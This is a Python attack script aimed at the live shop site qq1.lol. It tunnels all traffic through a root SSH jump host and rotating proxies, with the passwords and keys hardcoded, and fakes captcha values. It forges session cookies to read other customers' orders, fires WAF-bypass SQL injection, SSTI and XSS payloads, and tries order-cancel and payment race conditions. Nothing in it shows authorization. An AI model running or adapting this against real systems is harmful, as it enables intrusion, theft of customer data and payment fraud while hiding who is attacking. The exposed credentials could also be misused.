#!/usr/bin/env python3
"""qq1.lol vulnclass round2 — mysid forge, clickjacking, race cancel, WAF-bypass SQLi, so search SSTI"""
import hashlib
import json
import re
import shlex
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path("/workspace/results/qq1.lol")
LOG = OUT / "vulnclass2.log"
HITS = OUT / "vulnclass_hits.jsonl"
QG_KEY, QG_PWD = "C413ED6D", "344F550A6F8B"
JP_PASS, JP_HOST = "DX4LmrDaPfd9", "42.240.167.114"
JAR = "/tmp/qq1_vc2.jar"
_px = None


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body="", severity="MEDIUM"):
    with open(HITS, "a") as f:
        f.write(json.dumps({"kind": kind, "detail": detail, "severity": severity, "body": (body or "")[:5000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{severity}/{kind}] {detail}: {(body or '')[:250]}")


def ssh(script, timeout=50):
    return subprocess.run(
        ["sshpass", "-p", JP_PASS, "ssh", "-o", "StrictHostKeyChecking=no", f"root@{JP_HOST}", script],
        capture_output=True, text=True, timeout=timeout, errors="replace",
    ).stdout or ""


def proxy(force=False):
    global _px
    if _px and not force:
        return _px
    d = json.loads(ssh(f"curl -s 'https://share.proxy.qg.net/get?key={QG_KEY}&num=1'", 20))
    _px = f"http://{QG_KEY}:{QG_PWD}@{d['data'][0]['server']}"
    log(f"proxy {_px.split('@')[1]}")
    return _px


def curl(url, post=None, mt=22, cookie_override=None, extra=""):
    px = proxy()
    jar = f"-b {JAR} -c {JAR}" if not cookie_override else f"-b {shlex.quote(cookie_override)}"
    hdr = "-H 'Referer: https://qq1.lol/' -H 'X-Requested-With: XMLHttpRequest' " + extra
    pp = f"-X POST -d {shlex.quote(post)}" if post is not None else ""
    script = (
        f"curl -sk --max-time {mt} -x {shlex.quote(px)} {jar} -A 'Mozilla/5.0' "
        f"{hdr} {pp} -w '\\n__HTTP:%{{http_code}}' {shlex.quote(url)}"
    )
    out = ssh(script, mt + 25)
    if "__HTTP:" not in out:
        return out.strip(), "000"
    body, code = out.rsplit("__HTTP:", 1)
    return body.strip(), code.strip()


def session():
    ssh(f"rm -f {JAR}")
    proxy(True)
    curl(f"{BASE}/")
    buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
    hs_m = re.search(r"var hashsalt=(.+);", buy)
    csrf = csrf.group(1) if csrf else ""
    hs = ""
    if hs_m:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
    return csrf, hs


def test_mysid_forge():
    log("=== [1] mysid / cookiesid forge ===")
    # create order with session A
    csrf, hs = session()
    marker = f"sid{int(time.time())%100000}"
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        f"tid=102&num=1&inputvalue={marker}&csrf_token={csrf}&hashsalt={hs}"
        "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
    )
    log(f"pay: {str(pay)[:120]}")
    jar = ssh(f"cat {JAR}")
    mysid = None
    for line in jar.splitlines():
        if "\tmysid\t" in line or line.endswith("mysid") or "\tmysid\t" in line.replace(" ", "\t"):
            parts = line.split("\t")
            if len(parts) >= 7:
                mysid = parts[6]
    # parse netscape jar
    for line in jar.splitlines():
        if not line.startswith("#") and "mysid" in line:
            mysid = line.split("\t")[-1].strip()
    log(f"mysid={mysid}")

    # try forged mysids to see other users' orders on query page
    candidates = [
        mysid,
        "0", "1", "admin", "ffffffff", "00000000000000000000000000000000",
        hashlib.md5(b"1").hexdigest(), hashlib.md5(b"admin").hexdigest(),
        "bb9c2f8dfeb54628facfbad8f849185e",  # previous session
    ]
    for mid in candidates:
        if not mid:
            continue
        cookie = f"mysid={mid}; PHPSESSID=forgedsession123"
        body, code = curl(f"{BASE}/?mod=query", cookie_override=cookie)
        if body and "showOrder" in body:
            hit("mysid_idor", f"mysid={mid}", body[:2000], "CRITICAL")
        elif body and "没有任何订单" not in body and "<tbody>" in body:
            tbody = body.split("<tbody>")[1].split("</tbody>")[0]
            if "empty" not in tbody and "没有任何" not in tbody and len(tbody) > 50:
                hit("mysid_orders", f"mysid={mid}", tbody[:1500], "HIGH")
            log(f"  mysid={mid[:20]} tbody={tbody[:80]!r}")
        time.sleep(0.6)


def test_clickjacking():
    log("=== [2] Clickjacking (XFO/CSP frame-ancestors) ===")
    body, _ = curl(f"{BASE}/", extra="-D -")
    has_xfo = bool(re.search(r"(?i)x-frame-options:", body or ""))
    has_csp_frame = bool(re.search(r"(?i)content-security-policy:.*frame-ancestors", body or ""))
    if not has_xfo and not has_csp_frame:
        hit("clickjacking", "no X-Frame-Options / CSP frame-ancestors", "missing headers", "LOW")


def test_so_ssti_xss():
    log("=== [3] Search SSTI / XSS ===")
    payloads = [
        "{{7*7}}", "${7*7}", "#{7*7}",
        "<script>alert(1)</script>",
        '"><svg/onload=alert(1)>',
    ]
    for p in payloads:
        body, code = curl(f"{BASE}/?mod=so&kw={quote(p)}")
        if body and "49" in body and "{{7*7}}" in p:
            # check if evaluated
            if "49" in body and "{{7*7}}" not in body:
                hit("ssti", p, body[:800], "HIGH")
        if body and p in body and "&lt;" not in body and "\\u003c" not in body:
            if "<script>" in p or "onerror" in p or "onload" in p:
                hit("xss_so", p, body[:800], "HIGH")
        log(f"  so kw={p[:30]!r} HTTP={code} reflected={p in (body or '')}")
        time.sleep(0.5)


def test_waf_bypass_sqli():
    log("=== [4] WAF bypass SQLi (not timing false positive) ===")
    # payloads that might slip WAF
    payloads = [
        "1%00'",
        "1'/**/OR/**/1=1#",
        "1'%0aOR%0a1=1#",
        "1'||'1'='1",
        "1' AND 1=1#",
        "1 AND 1=1",
        "1' XOR 1=1#",
        "%bf%27 OR 1=1#",
    ]
    for p in payloads:
        body, code = curl(f"{BASE}/?mod=query&data={quote(p)}")
        # real SQLi would return orders table or SQL error, not WAF page
        if body and "危险字符" in body:
            log(f"  blocked: {p[:30]}")
        elif body and ("showOrder" in body or "mysql" in body.lower() or "syntax" in body.lower()):
            hit("sqli_bypass", p, body[:1500], "CRITICAL")
        elif body and "没有查询到" in body:
            log(f"  clean miss: {p[:30]}")
        else:
            log(f"  other HTTP={code} {str(body)[:60]!r}")
        time.sleep(0.5)


def test_race_cancel_pay():
    log("=== [5] Race: create order then parallel cancel ===")
    csrf, hs = session()
    pay, _ = curl(
        f"{BASE}/ajax.php?act=pay",
        f"tid=102&num=1&inputvalue=race1&csrf_token={csrf}&hashsalt={hs}"
        "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
    )
    tn_m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    if not tn_m:
        log(f"  pay fail: {str(pay)[:100]}")
        return
    tn = tn_m.group(1)
    log(f"  tn={tn}")
    # cancel
    can, _ = curl(f"{BASE}/ajax.php?act=cancel", f"orderid={tn}&hashsalt={hs}&csrf_token={csrf}")
    log(f"  cancel: {can}")
    shop, _ = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
    log(f"  getshop after cancel: {shop}")
    # try pay again on cancelled?
    sub, _ = curl(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
    log(f"  submit after cancel len={len(sub)} head={str(sub)[:120]!r}")


def test_input_overflow():
    log("=== [6] Input overflow / null byte ===")
    csrf, hs = session()
    for label, val in [
        ("long", "A" * 5000),
        ("null", "test%00admin"),
        ("unicode", "布衣" * 100),
        ("emoji", "🔥" * 50),
    ]:
        buy, _ = curl(f"{BASE}/?mod=buy&cid=4&tid=102")
        csrf_m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy)
        hs_m = re.search(r"var hashsalt=(.+);", buy)
        if not csrf_m or not hs_m:
            continue
        csrf = csrf_m.group(1)
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=8,
        ).stdout.strip()
        body, code = curl(
            f"{BASE}/ajax.php?act=pay",
            f"tid=102&num=1&inputvalue={quote(val)}&csrf_token={csrf}&hashsalt={hs}"
            "&geetest_challenge=1&geetest_validate=1&geetest_seccode=1|jordan",
        )
        log(f"  {label}: HTTP={code} {str(body)[:100]}")
        if body and '"code":0' in body and label == "null":
            hit("null_byte_input", label, body, "MEDIUM")
        time.sleep(0.8)


def main():
    log("=== VULNCLASS2 START ===")
    test_clickjacking()
    test_so_ssti_xss()
    test_waf_bypass_sqli()
    test_mysid_forge()
    test_race_cancel_pay()
    test_input_overflow()
    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== VULNCLASS2 DONE total_hits_file={n} ===")


if __name__ == "__main__":
    main()
